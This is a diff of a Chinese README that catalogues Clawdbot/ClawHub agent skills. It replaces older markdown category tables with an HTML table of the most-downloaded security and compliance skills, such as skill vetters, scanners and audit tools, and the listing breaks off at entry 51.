-| Polymarket 自动交易机器人 | [Clawdbot/polymarket-traiding-bot](https://clawdhub.com/skills/polymarket-traiding-bot) | （无） |
-| Queue 配置生成器 | [Clawdbot/queue-config-gen](https://clawdhub.com/skills/queue-config-gen) | 生成 BullMQ 作业队列设置和工作人员。在实现后台作业时使用。 |
-| Queue 配置生成器 | [Clawdbot/queue-gen](https://clawdhub.com/skills/queue-gen) | 生成 BullMQ 作业队列设置和工作人员。在实现后台作业时使用。 |
-| Reddit 浏览 | [Clawdbot/reddit](https://clawdhub.com/skills/reddit) | 浏览、搜索、发布和审核 Reddit。只读，无需授权；发布/审核需要 OAuth 设置。 |
-| Reddit CLI | [Clawdbot/reddit-cli](https://clawdhub.com/skills/reddit-cli) | Reddit CLI 使用 cookie 进行身份验证。阅读帖子、搜索并获取 Reddit 子版块信息。 |
-| Reddit 搜索 | [Clawdbot/reddit-search](https://clawdhub.com/skills/reddit-search) | 在 Reddit 上搜索 subreddits 并获取有关它们的信息。 |
-| Research | [Clawdbot/research](https://clawdhub.com/skills/research) | 通过 Gemini CLI 进行深入研究 — 在后台子代理中运行，因此您不会烧毁您的 Claude 代币。 |
-| Roadrunner | [Clawdbot/roadrunner](https://clawdhub.com/skills/roadrunner) | Beeper 桌面 CLI 用于聊天、消息、搜索和提醒。 |
-| Roku 控制 | [Clawdbot/roku](https://clawdhub.com/skills/roku) | 通过 CLI 控制 Roku 设备。发现、远程控制、应用程序启动、搜索和用于实时控制的 HTTP 桥接模式。 |
-| Search Reddit | [Clawdbot/search-reddit](https://clawdhub.com/skills/search-reddit) | 使用 OpenAI web_search 实时搜索 Reddit 并进行丰富化（参与度 + 热门评论）。当您需要最近的 Reddit 主题、子 Reddit 过滤结果或快速链接列表时使用。 |
-| Smart Followups | [Clawdbot/smart-followups](https://clawdhub.com/skills/smart-followups) | AI 响应后生成上下文后续建议。当用户请求“跟进”时，显示 3 个可点击按钮（快速、深入、相关）。 |
-| Tailwind Config 生成器 | [Clawdbot/tailwind-config-gen](https://clawdhub.com/skills/tailwind-config-gen) | 从品牌颜色生成 tailwind.config.js。设置 Tailwind 时使用。 |
-| Tweet Ideas Generator | [Clawdbot/tweet-ideas-generator](https://clawdhub.com/skills/tweet-ideas-generator) | 根据 5 个类别的参考内容生成 60 个高影响力的推文创意。当有人想要从 Twitter/X 的内容中提取引人入胜的简短陈述时使用，这些陈述由严厉的建议、引言、痛点、违反直觉的事实和关键见解组织而成。 |
-| UI Skills | [Clawdbot/ui-skills](https://clawdhub.com/skills/ui-skills) | 与代理建立更好的界面的自以为约束。 |
-| 语音唤醒 TTS | [Clawdbot/voice-wake-say](https://clawdhub.com/skills/voice-wake-say) | 当用户输入指示语音唤醒/语音识别时（例如，以“用户通过<设备>上的语音识别进行交谈”开头的消息），在 macOS 上使用内置的“say”命令大声说出响应。 |
-| Web Search by Exa | [Clawdbot/web-search-exa](https://clawdhub.com/skills/web-search-exa) | （无） |
-| WHOOP | [Clawdbot/whoop](https://clawdhub.com/skills/whoop) | WHOOP 早上登记（恢复/睡眠/紧张）并提供建议。 |
-| Whoop 健康分析 | [Clawdbot/whoop-health-analysis](https://clawdhub.com/skills/whoop-health-analysis) | 访问 Whoop 可穿戴健康数据（睡眠、恢复、压力、HRV、锻炼）并生成交互式图表。当用户询问睡眠质量、恢复分数、应变水平、HRV 趋势、锻炼数据或希望从其 Whoop 手环获得健康可视化/图表时使用。 |
-| WHOOP Morning | [Clawdbot/whoop-morning](https://clawdhub.com/skills/whoop-morning) | 每天早上检查 WHOOP 恢复/睡眠/紧张情况并发送建议。 |
-| Whoop Skill | [Clawdbot/whoopskill](https://clawdhub.com/skills/whoopskill) | WHOOP CLI 具有健康洞察、趋势分析和数据获取（睡眠、恢复、HRV、应变）。 |
+<a id="cat-security-compliance"></a>
 
-### 📱 社交媒体
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| A/B 测试设置 | [Clawdbot/ab-test-setup](https://clawdhub.com/skills/ab-test-setup) | 当用户想要计划、设计或实施 A/B 测试或实验时。当用户提及“A/B 测试”、“分割测试”、“实验”、“测试此更改”、“变体副本”、“多变量测试”或“假设”时也可使用。有关跟踪实施情况，请参阅分析跟踪。 |
-| 上下文恢复 | [Clawdbot/context-recovery](https://clawdhub.com/skills/context-recovery) | （无） |
-| Newsletter 摘要 | [Clawdbot/newsletter-digest](https://clawdhub.com/skills/newsletter-digest) | 总结时事通讯和文章，提取关键见解，创建阅读列表 |
-| Nix Mode | [Clawdbot/nix-mode](https://clawdhub.com/skills/nix-mode) | 在 Nix 模式下处理 Clawdbot 操作（配置管理、环境检测）。 |
-| Odos DEX 聚合器 | [Clawdbot/odos](https://clawdhub.com/skills/odos) | Odos 智能订单路由 DEX 聚合器。利用专利 SOR 算法在 500 多个流动性来源中提供最佳掉期利率。 |
-| ParaSwap DEX 聚合器 | [Clawdbot/paraswap](https://clawdhub.com/skills/paraswap) | ParaSwap DEX 聚合器。以太坊、Polygon、BSC、Arbitrum 等 300 多个流动性来源的最佳掉期利率。 |
-| 个人品牌建设 | [Clawdbot/personal-branding-authority](https://clawdhub.com/skills/personal-branding-authority) | 创始人与员工的个人品牌策略以及 LinkedIn 定位和退出计划 |
-| pet 命令片段管理器 | [Clawdbot/pet](https://clawdhub.com/skills/pet) | 简单的命令行片段管理器。用它来保存和重用复杂的命令。 |
-| Ranked Gym | [Clawdbot/ranked-gym](https://clawdhub.com/skills/ranked-gym) | 通过 XP、级别、成就和锻炼次数将您的健身课程游戏化 |
-| Red Pill | [Clawdbot/red-pill](https://clawdhub.com/skills/red-pill) | 醒醒……黑客帝国里有你。我是来让你看看兔子洞有多深的。 |
-| Sag TTS | [Clawdbot/sag](https://clawdhub.com/skills/sag) | ElevenLabs 具有 mac 风格 say UX 的文本转语音功能。 |
-| SlopeSniper | [Clawdbot/slopesniper](https://clawdhub.com/skills/slopesniper) | 通过 Jupiter DEX 交易 Solana 代币，具有自动执行和安全限制 |
-| SlopeSniper | [Clawdbot/slopesniper-skill](https://clawdhub.com/skills/slopesniper-skill) | 通过 Jupiter DEX 交易 Solana 代币，具有自动执行和安全限制 |
-| SuperDesign | [Clawdbot/superdesign](https://clawdhub.com/skills/superdesign) | 用于创建美观、现代 UI 的专家前端设计指南。在构建登陆页面、仪表板或任何用户界面时使用。 |
-| Swarm | [Clawdbot/swarm](https://clawdhub.com/skills/swarm) | （无） |
-| Telegram Usage Stats | [Clawdbot/telegram-usage](https://clawdhub.com/skills/telegram-usage) | 显示会话使用统计信息（配额、会话时间、令牌、上下文） |
-| Tootbot | [Clawdbot/tootbot](https://clawdhub.com/skills/tootbot) | 将内容发布到 Mastodon。当您需要发布乳齿象状态时使用。 |
-| What would Elon do | [Clawdbot/wed-1-0-1](https://clawdhub.com/skills/wed-1-0-1) | 埃隆会做什么？ - 将任何想法转化为无情的执行计划。一个命令即可生成完整的业务战略、MVP 规范、上市计划和第一周行动项目。想得更大一些。移动得更快。 /wed '你的想法' |
-| X Article Editor | [Clawdbot/x-article-editor](https://clawdhub.com/skills/x-article-editor) | （无） |
-| X to Kindle | [Clawdbot/x-kindle](https://clawdhub.com/skills/x-kindle) | 将 X/Twitter 帖子发送到 Kindle 进行无干扰阅读。当用户共享 X/Twitter 链接并想要在 Kindle 上阅读它，或要求将推文/话题发送到其 Kindle 设备时使用。 |
-| X Trends | [Clawdbot/x-trends](https://clawdhub.com/skills/x-trends) | 使用公共聚合器获取任何国家/地区 X (Twitter) 上当前最热门的主题。 |
-| X Trends | [Clawdbot/x-trends-dev](https://clawdhub.com/skills/x-trends-dev) | 使用公共聚合器获取任何国家/地区 X (Twitter) 上当前最热门的主题。 |
-| 小红书技能 | [Clawdbot/xiaohongshu](https://clawdhub.com/skills/xiaohongshu) | （无） |
-| 飞书群聊助手 | [Clawdbot/feishu-chat](https://clawdhub.com/skills/feishu-chat) | 通过 OpenClaw 集成在飞书群聊中发送消息、使用 Markdown 格式、@ 成员并管理群成员，提供完整的飞书群聊操作指引。 |
-| 微信桌面端 MCP 集成 | [Clawdbot/wechat-mcp](https://clawdhub.com/skills/wechat-mcp) | Windows 电脑端微信消息监控与发送的 MCP 技能，支持截图、搜索并打开联系人、发送消息等，适合通过 Python/MCP 自动化微信对话。 |
-| 小红书自动发布器 | [Clawdbot/xiaohongshuskills](https://clawdhub.com/skills/xiaohongshuskills) | 将图文或视频内容自动发布到小红书（XHS），支持发布图文、发布视频或仅启动测试浏览器，并提供搜索、详情、评论、@ 通知和内容数据指标等能力。 |
-| 小红书全能助手 - RedNote | [Clawdbot/xhs](https://clawdhub.com/skills/xhs) | 小红书全能助手，覆盖文案生成、标题和封面设计、内容发布与管理，可一站式完成写稿、生成封面、发布笔记及后续互动，支持多种 AI 封面生图服务与灵活登录方式。 |
+## 6、🔒 安全合规
 
-### 💰 金融与交易
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| ChangeNOW 加密货币交换 | [Clawdbot/changenow](https://clawdhub.com/skills/changenow) | 通过 ChangeNOW 执行即时加密货币交换并赚取附属佣金。当有人想要交换代币（例如，将 HBAR 转换为 HYPE）并且您希望确保交易包含合作伙伴费用时使用。 |
-| LNbits 闪电钱包管理 | [Clawdbot/lnbits](https://clawdhub.com/skills/lnbits) | 管理LNbits闪电钱包（余额、付款、发票） |
-| Solana 技能 | [Clawdbot/solana-skills](https://clawdhub.com/skills/solana-skills) | Solana 钱包操作 - 创建钱包、检查余额、发送 SOL/代币、通过 Jupiter 交换、在 Pump.fun 上启动代币 |
-| Solana Swaps | [Clawdbot/solana-swaps](https://clawdhub.com/skills/solana-swaps) | 通过 Jupiter 聚合器在 Solana 上交换代币并检查钱包余额。当用户想要交换代币、检查 SOL/代币余额或获取交换报价时使用。 |
-| 港股 IPO 打新研究助手 | [Clawdbot/hk-ipo-research-assistant](https://clawdhub.com/skills/hk-ipo-research-assistant) | 港股 IPO 打新研究助手，抓取实时数据（孖展、基石、评级、暗盘、中签率）并用 AI 分析判断，支持一键综合分析、单股分项查询、基金及券商排行、历史数据对比和中签率预测。 |
-| Transak | [Clawdbot/transak](https://clawdhub.com/skills/transak) | Transak 为 Web3 提供法币到加密货币的入口。通过 170 多个国家/地区的 100 多种支付方式买卖加密货币。 |
+> 该分类共 **2,124** 个技能，以下按下载量倒序展示 Top 200。
 
-### 🏃 健康与生活
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Fitbit 健康数据 | [Clawdbot/fitbit](https://clawdhub.com/skills/fitbit) | 查询 Fitbit 健康数据，包括睡眠、心率、活动、SpO2 和呼吸频率。当用户询问他们的健康状况、睡眠质量、步数或健康指标时使用。 |
-| Fitbit 健康数据 | [Clawdbot/fitbit-health](https://clawdhub.com/skills/fitbit-health) | 通过 CLI 查询 Fitbit 健康数据（活动、睡眠、心率、体重）。在回答需要 Fitbit 数据的健康/健身问题时，或者当用户通过 Fitbit 询问其步数、睡眠、心率或体重时使用。 |
-| Oura Ring 数据 | [Clawdbot/ouracli](https://clawdhub.com/skills/ouracli) | 使用 ouracli CLI 工具访问 Oura Ring 健康数据。当用户询问“oura 数据”、“睡眠统计数据”、“活动数据”、“心率”、“准备度得分”、“压力水平”或想要从其 Oura Ring 获取健康指标时使用。 |
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>技能安全审核</td>
+<td>Skill Vetter</td>
+<td><a href="https://clawdhub.com/skills/skill-vetter">ClawHub/skill-vetter</a></td>
+<td>AI智能体技能安全预审工具。安装ClawdHub、GitHub等来源技能前，检查风险信号、权限范围及可疑模式。</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>1password</td>
+<td>1password</td>
+<td><a href="https://clawdhub.com/skills/1password">ClawHub/1password</a></td>
+<td>设置和使用 1Password CLI (op)。适用于：安装 CLI、启用桌面应用集成、登录（单/多账户）、通过 op 读取/注入/运行密钥。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>安全防护</td>
+<td>MoltGuard - Security &amp; Antivirus &amp; Guardrails 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltguard">ClawHub/moltguard</a></td>
+<td>MoltGuard — OpenClaw 安全守卫，由 OpenGuardrails 提供。安装 MoltGuard，保护您和您的用户免受提示注入、数据泄露和恶意攻击。</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>OpenClaw备份</td>
+<td>OpenClaw Backup</td>
+<td><a href="https://clawdhub.com/skills/openclaw-backup">ClawHub/openclaw-backup</a></td>
+<td>备份与恢复 OpenClaw 数据。适用于创建备份、设置自动备份计划、从备份恢复或管理备份轮转。处理 ~/.openclaw 目录归档并包含适当的排除规则。</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>技能扫描器</td>
+<td>Skill Scanner</td>
+<td><a href="https://clawdhub.com/skills/skill-scanner">ClawHub/skill-scanner</a></td>
+<td>在安装前扫描Clawdbot和MCP技能中的恶意软件、间谍软件、加密货币挖矿程序和恶意代码模式。安全审计工具，可检测数据外泄、系统篡改尝试、后门和混淆技术。</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>安全auditor</td>
+<td>Security Auditor</td>
+<td><a href="https://clawdhub.com/skills/security-auditor">ClawHub/security-auditor</a></td>
+<td>用于代码安全漏洞审查、身份验证流程实现、OWASP Top 10审计、CORS/CSP 头部配置、密钥处理、输入验证、SQL 注入防护、XSS 防护及其他安全相关代码审查。</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>OpenClaw技能审核</td>
+<td>Skill Vetter - Pre-Install Security Review</td>
+<td><a href="https://clawdhub.com/skills/openclaw-skill-vetter">ClawHub/openclaw-skill-vetter</a></td>
+<td>安装任意AI代理技能前的安全审查协议。针对凭证窃取、混淆代码、数据渗出进行危险信号检测。风险等级分类L...</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>百度网盘</td>
+<td>百度网盘</td>
+<td><a href="https://clawdhub.com/skills/baidu-netdisk-skills">ClawHub/baidu-netdisk-skills</a></td>
+<td>百度网盘文件管理：支持上传、下载、转存、分享、搜索、移动、复制、重命名、创建文件夹。用户提及百度网盘、百度云、百度云盘、bdpan、网盘、云盘、baidu netdisk、baidu pan、baidu cloud并涉及文件操作时触发。</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>t交易</td>
+<td>T Trading</td>
+<td><a href="https://clawdhub.com/skills/t-trading">ClawHub/t-trading</a></td>
+<td>基于维加斯通道EMA多层通道与斐波那契回撤，提供A股和加密货币短线交易的多维度结构化技术分析和明确操作建议。</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>Searxng</td>
+<td>Searxng</td>
+<td><a href="https://clawdhub.com/skills/searxng">ClawHub/searxng</a></td>
+<td>使用本地SearXNG实例进行隐私保护的元搜索。无需外部API依赖即可搜索网页、图片、新闻等。</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>Camsnap</td>
+<td>Camsnap</td>
+<td><a href="https://clawdhub.com/skills/camsnap">ClawHub/camsnap</a></td>
+<td>从RTSP/ONVIF摄像机捕获帧或片段。</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>fintech-engineer</td>
+<td>fintech-engineer</td>
+<td><a href="https://clawdhub.com/skills/fintech-engineer">ClawHub/fintech-engineer</a></td>
+<td>{&quot;answer&quot;:&quot;资深金融科技工程师，专精金融系统、监管合规与安全交易处理。精通银行对接与支付系统，能构建符合严苛合规要求的可扩展金融科技架构。&quot;}</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>verified代理identity</td>
+<td>Verified Agent Identity</td>
+<td><a href="https://clawdhub.com/skills/verified-agent-identity">ClawHub/verified-agent-identity</a></td>
+<td>用于代理的去中心化身份系统。利用Billions ERC-8004和证明注册库将代理与人类身份关联。验证并生成真实可信的凭证。</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>mx金融搜索</td>
+<td>Financial Search Engine 🔑</td>
+<td><a href="https://clawdhub.com/skills/mx-finance-search">ClawHub/mx-finance-search</a></td>
+<td>基于东方财富数据库，支持自然语言搜索全网最新公告、研报、财经新闻、交易所动态及官方政策等，覆盖全球市场标的，可用于热点捕捉、舆情监控、研报速览、公告精读及投资决策等场景。Natural language search for financial information, covering authoritativ...</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>技能vetting</td>
+<td>Skill Vetting</td>
+<td><a href="https://clawdhub.com/skills/skill-vetting">ClawHub/skill-vetting</a></td>
+<td>在安装前审查 ClawHub 技能的安全性与实用性。适用于考虑安装技能、评估第三方代码或评估风险时使用。</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td>ClawSec</td>
+<td>ClawSec</td>
+<td><a href="https://clawdhub.com/skills/clawsec">ClawHub/clawsec</a></td>
+<td>管理与操作 ClawSec Monitor v3.0（一款MITM HTTP/HTTPS代理），用于记录AI代理流量并实时检测数据窃取与注入威胁。</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>安全sentinel技能</td>
+<td>Anti-Injection-Skill</td>
+<td><a href="https://clawdhub.com/skills/security-sentinel-skill">ClawHub/security-sentinel-skill</a></td>
+<td>检测提示注入、越狱、角色劫持和系统提取企图。采用多层防御，结合语义分析与惩罚评分。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>安全审计toolkit</td>
+<td>Security Audit Toolkit</td>
+<td><a href="https://clawdhub.com/skills/security-audit-toolkit">ClawHub/security-audit-toolkit</a></td>
+<td>审计代码库和基础设施的安全问题。用于扫描依赖项漏洞、检测硬编码密钥、检查OWASP Top 10问题、验证SSL/TLS、审计文件权限或审查代码注入和认证漏洞。</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>技能防护</td>
+<td>skill-guard</td>
+<td><a href="https://clawdhub.com/skills/skill-guard">ClawHub/skill-guard</a></td>
+<td>在安装前扫描 ClawHub 技能的安全漏洞。从 ClawHub 安装新技能时使用，可检测提示词注入、恶意软件负载、硬编码密钥及其他威胁。使用 mcp-scan 预检包裹 clawhub 安装过程。</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>安全审计</td>
+<td>Security Audit</td>
+<td><a href="https://clawdhub.com/skills/security-audit">ClawHub/security-audit</a></td>
+<td>对 Clawdbot 部署进行全方位安全审计，扫描暴露凭证、开放端口、弱配置及漏洞，支持自动修复。</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>安全扫描器</td>
+<td>Security Scanner</td>
+<td><a href="https://clawdhub.com/skills/security-scanner">ClawHub/security-scanner</a></td>
+<td>自动化安全扫描和漏洞检测，适用于Web应用、API和基础设施；可进行漏洞扫描、SSL证书检查、开放端口检测、配置错误发现及安全审计，集成nmap、nuclei等安全工具。</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>安全扫描防护</td>
+<td>ClawDefender - OpenClaw Security - Prompt injection, rogue skills etc</td>
+<td><a href="https://clawdhub.com/skills/clawdefender">ClawHub/clawdefender</a></td>
+<td>AI代理的安全扫描器和输入清理器。检测提示词注入、命令注入、SSRF、凭证泄露和路径遍历攻击。用于：(1)从ClawHub安装新技能，(2)处理邮件、日历事件、Trello卡片或API响应等外部输入，(3)验证URL后再获取，(4)对工作区进行安全审计。保护代理免受不受信任数据源中的恶意内容侵害。</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>clawsec套件</td>
+<td>clawsec-suite</td>
+<td><a href="https://clawdhub.com/skills/clawsec-suite">ClawHub/clawsec-suite</a></td>
+<td>ClawSec 套件管理器，内嵌情报监控、加密签名验证、审批门控的恶意技能响应及引导式设置。</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>技能审核100</td>
+<td>Skill Vetter 1.0.0</td>
+<td><a href="https://clawdhub.com/skills/skill-vetter-1-0-0">ClawHub/skill-vetter-1-0-0</a></td>
+<td>安全优先的AI技能审查工具，在安装ClawdHub、GitHub等来源技能前进行，检查红旗、权限范围等。</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>PDF智能工具cn</td>
+<td>Pdf Smart Tool Cn</td>
+<td><a href="https://clawdhub.com/skills/pdf-smart-tool-cn">ClawHub/pdf-smart-tool-cn</a></td>
+<td>PDF智能处理工具 v2.1 | PDF Smart Tool. 支持PDF转换、OCR识别、合并拆分、数字签名、批量处理、水印添加、加密解密。触发词：PDF、转换、识别。</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>Clawdbot安全check</td>
+<td>Clawdbot Security Check</td>
+<td><a href="https://clawdhub.com/skills/clawdbot-security-check">ClawHub/clawdbot-security-check</a></td>
+<td>{&quot;answer&quot;:&quot;对Clawdbot自身配置执行全面的只读安全审计。此技能教导Clawdbot识别系统加固机会。当用户要求“运行安全检查”、“审计clawdbot”、“检查安全加固”或“有哪些漏洞”时使用。该技能利用内部能力和文件系统检查配置、检测错误配置并推荐修复方案。设计可扩展，通过更新知识即可添加新检查。&quot;}</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>Safe Exec</td>
+<td>Safe Exec</td>
+<td><a href="https://clawdhub.com/skills/safe-exec">ClawHub/safe-exec</a></td>
+<td>为OpenClaw Agents提供安全的命令执行功能，具备自动危险模式检测、风险评估、用户审批流程及审计日志。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>防护扫描器</td>
+<td>Guard Scanner</td>
+<td><a href="https://clawdhub.com/skills/guard-scanner">ClawHub/guard-scanner</a></td>
+<td>OpenClaw 技能、MCP 服务器和 AI 代理工作流的安全扫描与运行时防护。检测提示注入、身份劫持、内存污染等。</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>安全监控</td>
+<td>Security Monitor</td>
+<td><a href="https://clawdhub.com/skills/security-monitor">ClawHub/security-monitor</a></td>
+<td>实时安全监控Clawdbot，检测入侵、异常API调用和凭证使用模式，并在违规时告警。</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>Clawdex by Koi</td>
+<td>Clawdex by Koi</td>
+<td><a href="https://clawdhub.com/skills/clawdex">ClawHub/clawdex</a></td>
+<td>ClawHub 技能安全检查（由 Koi 提供）。安装任何技能前查询 Clawdex API 以验证安全性。</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>专业前端设计规范</td>
+<td>Frontend Design Pro — 专业前端设计规范</td>
+<td><a href="https://clawdhub.com/skills/frontend-design-pro">ClawHub/frontend-design-pro</a></td>
+<td>前端设计质量提升 skill。让 AI 生成的 UI/前端代码更专业，避免常见设计反模式。 参考 impeccable 项目的设计语言规范，提供 audit/polish/critique 等设计审查命令。 触发词：/audit /polish /critique /colorize /animate /bold...</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>加密交易机器人</td>
+<td>Crypto Trading Bot</td>
+<td><a href="https://clawdhub.com/skills/crypto-trading-bot">ClawHub/crypto-trading-bot</a></td>
+<td>加密貨幣交易機器人開發 - 幫你整自動交易Bot，支持Pine Script、Python、CCXT API對接。適用於：(1)整TradingView信號Bot (2)CEX/DEX API自動化 (3)套利機器人 (4)止盈止損策略</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>yoder技能auditor</td>
+<td>Yoder Skill Auditor</td>
+<td><a href="https://clawdhub.com/skills/yoder-skill-auditor">ClawHub/yoder-skill-auditor</a></td>
+<td>OpenClaw技能的权威安全扫描器。含18项安全检查，包括提示注入检测、下载并执行、提权等...</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>安全reviewer</td>
+<td>security-reviewer</td>
+<td><a href="https://clawdhub.com/skills/pentest">ClawHub/pentest</a></td>
+<td>用于执行安全审计、代码漏洞审查或基础设施安全分析。适用于SAST扫描、渗透测试、DevSecOps实践及云安全评估。</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>Zero Trust</td>
+<td>Zero Trust</td>
+<td><a href="https://clawdhub.com/skills/zero-trust">ClawHub/zero-trust</a></td>
+<td>以安全为核心的行为准则，用于所有涉及外部资源的谨慎操作。适用于URL/链接交互、包安装、API密钥处理、邮件/消息发送、社媒发帖、金融交易或任何可能泄露数据或产生不可逆后果的行为。</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>simple备份</td>
+<td>Simple Backup</td>
+<td><a href="https://clawdhub.com/skills/simple-backup">ClawHub/simple-backup</a></td>
+<td>将智能体的大脑（工作区）和身体（状态）备份至本地文件夹，并可选择通过 rclone 同步至云端。</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>Dont Hack Me</td>
+<td>Dont Hack Me</td>
+<td><a href="https://clawdhub.com/skills/dont-hack-me">ClawHub/dont-hack-me</a></td>
+<td>別駭我！基本安全檢測 — Security self-check for Clawdbot/Moltbot. Run a quick audit of your clawdbot.json to catch dangerous misconfigurations — exposed gateway, missing auth, open DM policy, weak tokens, loo...</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>OpenClaw配置</td>
+<td>Openclaw Config</td>
+<td><a href="https://clawdhub.com/skills/openclaw-config">ClawHub/openclaw-config</a></td>
+<td>编辑并校验 OpenClaw Gateway 配置。用于增改配置项或排查校验错误，避免因模式不匹配导致启动失败或安全策略受损。</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>Tailscale</td>
+<td>Tailscale 🔑</td>
+<td><a href="https://clawdhub.com/skills/tailscale">ClawHub/tailscale</a></td>
+<td>通过 CLI 和 API 管理 Tailscale 网络。当用户要求“检查 Tailscale 状态”、“列出设备”、“Ping 设备”、“通过 Tailscale 发送文件”、“使用 Tailscale funnel”、“创建认证密钥”、“查看在线状态”或提及 Tailscale 网络管理时使用。</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>市场sentiment</td>
+<td>Market Sentiment</td>
+<td><a href="https://clawdhub.com/skills/market-sentiment">ClawHub/market-sentiment</a></td>
+<td>加密货币市场情绪分析，整合恐惧贪婪指数、社交媒体情绪、资金流向等多维度数据。每次调用收费0.001 USDT。触发词：市场情绪、sentiment、恐惧贪婪指数、市场分析。</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>risk管理specialist</td>
+<td>Risk Management Specialist</td>
+<td><a href="https://clawdhub.com/skills/risk-management-specialist">ClawHub/risk-management-specialist</a></td>
+<td>医疗器械风险管理专家，贯彻ISO 14971标准，贯穿产品全生命周期，提供风险分析、风险评价、风险控制及上市后监督等服务。</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>WordPress</td>
+<td>WordPress 🔑</td>
+<td><a href="https://clawdhub.com/skills/wordpress-api">ClawHub/wordpress-api</a></td>
+<td>通过托管 OAuth 集成 WordPress.com API，管理文章、页面、站点和内容，适用于用户的创建、读取、更新或删除需求。</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>Asana</td>
+<td>Asana 🔑</td>
+<td><a href="https://clawdhub.com/skills/asana">ClawHub/asana</a></td>
+<td>通过 Asana REST API 管理 Asana，用于列出工作区、项目、任务，搜索、评论、更新、完成或创建任务。</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>critical代码reviewer</td>
+<td>Critical Code Reviewer</td>
+<td><a href="https://clawdhub.com/skills/critical-code-reviewer">ClawHub/critical-code-reviewer</a></td>
+<td>进行严格对抗性的代码审查，绝不容忍平庸。用于用户要求严格审查代码或PR、批评代码、找出代码问题或代码有何不足时。识别Python、R、JavaScript/TypeScript、SQL及前端代码中的安全漏洞、懒散模式、边界情况失败和不良实践。仔细检查错误处理、类型安全、性能、可访问性和代码质量。提供阻塞性、必需性、建议等严重级别的结构化反馈及具体可操作的建议。</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>wordpress专业版</td>
+<td>Wordpress Pro</td>
+<td><a href="https://clawdhub.com/skills/wordpress-pro">ClawHub/wordpress-pro</a></td>
+<td>适用于WordPress主题、插件开发、Gutenberg区块定制、WooCommerce功能实现及性能与安全优化。</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>凭据管理器</td>
+<td>Credential Manager</td>
+<td><a href="https://clawdhub.com/skills/credential-manager">ClawHub/credential-manager</a></td>
+<td>OpenClaw 必须的安全基础。将分散的 API 密钥和凭证统一到具备正确权限的 .env 文件中。在部署 OpenClaw、迁移凭证、进行安全审计或强制执行 .env 标准时使用。不可省略——集中凭证管理是安全部署的核心要求。扫描常见位置的凭证文件，备份已有文件，创建统一 .env（权限 600），验证安全性并遵循最佳实践。</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>Vincent - Wallet</td>
+<td>Vincent - Wallet</td>
+<td><a href="https://clawdhub.com/skills/agentwallet">ClawHub/agentwallet</a></td>
+<td>代理钱包：用于EVM链交易和原始签名，适用于创建钱包、转账、代币兑换、DEX交易、智能合约交互等场景。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>Ecommerce</td>
+<td>Ecommerce</td>
+<td><a href="https://clawdhub.com/skills/ecommerce">ClawHub/ecommerce</a></td>
+<td>构建并运营网店，具备支付安全、库存管理、市场整合及转化优化功能。</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>AIproductivity审计</td>
+<td>Ai Productivity Audit</td>
+<td><a href="https://clawdhub.com/skills/ai-productivity-audit">ClawHub/ai-productivity-audit</a></td>
+<td>审计用户现有的AI工具栈。按投资回报率（ROI）为每个工具评分，识别冗余、缺口及升级机会，并生成包含评分的结构化报告。</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>PublishAPI</td>
+<td>Publish Api</td>
+<td><a href="https://clawdhub.com/skills/api">ClawHub/api</a></td>
+<td>涵盖147项服务的REST API参考，包括认证模式、端点、速率限制及常见陷阱。</td>
+</tr>
+<tr>
+<td align="center">51</td>
